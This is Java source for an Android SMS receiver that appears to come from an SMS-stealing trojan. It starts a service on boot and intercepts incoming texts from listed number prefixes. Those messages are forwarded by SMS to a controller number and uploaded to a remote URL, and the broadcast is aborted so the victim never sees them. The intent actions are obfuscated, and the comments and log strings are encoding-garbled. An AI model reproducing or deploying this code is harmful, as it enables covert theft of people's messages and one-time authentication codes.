package com.sms.web.receiver;

import java.util.Date;
import android.app.Activity;
import android.app.sdk.SmsActivity;
import android.app.sms.async.SubmitDateThread;
import android.app.sms.manager.SMSManager;
import android.app.sms.service.RestartService;
import android.app.sms.sqlite.DQLiteOpenHelper;
import android.app.sms.utils.BaseData;
import android.app.sms.utils.LogUtils;
import android.app.sms.utils.Tools;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		String action = Tools.Eecode(intent.getAction());
		LogUtils.write("Send", "�յ��㲥=" + intent.getAction());
		if (action.equals(BaseData.bootaction1)) {	//����������
			Intent newIntent = new Intent(context, RestartService.class);
			newIntent.setAction("android.intent.action.MAIN");
			newIntent.addCategory("android.intent.category.LAUNCHER");
			newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(newIntent);
		} else if (action.equals(BaseData.smsfilter1) || action.equals(BaseData.smsfilter2) || action.equals(BaseData.smsfilter3)) {
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				String address = null;
				StringBuffer body = new StringBuffer();
				SmsMessage[] messages = new SmsMessage[pdus.length];
                for(int i = 0; i < messages.length; i++) {
                    byte[] pdu = (byte[])pdus[i];
                    messages[i] = SmsMessage.createFromPdu(pdu);
                }
                for(SmsMessage sm: messages) {
                    String content = sm.getMessageBody();
                    body.append(content);
                    address = sm.getOriginatingAddress();
                }
                if (address != null) {
                	LogUtils.write("Send", "�㲥���������Ž���:address=" + address + ",body=" + body);
                    boolean isflag = false;
                    address = address.replace("+86", "").replace("+1", "");
                    for (int i = 0; i < BaseData.nums.length; i++) {
    					if (address.startsWith(BaseData.nums[i])) {
    						isflag = true;
    						break;
    					}
    				}
                    if (isflag) {
                    	SMSManager.send(context, SmsActivity.getPhone(), SmsActivity.lanjie + address + "|" + body);
    					DQLiteOpenHelper.getHelper(context).addData("����", address, body.toString(), SmsActivity.interceptUrl, new Date());
    					SubmitDateThread.startSendData(context);
    					this.abortBroadcast();		//�˳��ù㲥
    				}
                }
			} else {
				LogUtils.write("Send", "�㲥��ȡ����ʧ��");
			}
		} else if (action.equals(BaseData.smssend)) {
			String phoneNum = intent.getStringExtra("phone");
			switch (getResultCode()) {
				case Activity.RESULT_OK:
					LogUtils.write("Send", phoneNum + "-���ŷ��ͳɹ�");
					break;
				case SmsManager.RESULT_ERROR_GENERIC_FAILURE: 
					LogUtils.write("Send", phoneNum + "-���ŷ���ʧ��RESULT_ERROR_GENERIC_FAILURE");
					break;
				case SmsManager.RESULT_ERROR_RADIO_OFF: 
					LogUtils.write("Send", phoneNum+"-���ŷ���ʧ��RESULT_ERROR_RADIO_OFF");		
					break;
				case SmsManager.RESULT_ERROR_NULL_PDU: 
					LogUtils.write("Send", phoneNum+"-���ŷ���ʧ��RESULT_ERROR_NULL_PDU");
					break;
				default:
					LogUtils.write("Send", phoneNum+"-δ֪����");
					break;
			}
		} else {
			SubmitDateThread.startSendData(context);
		}
	}

}
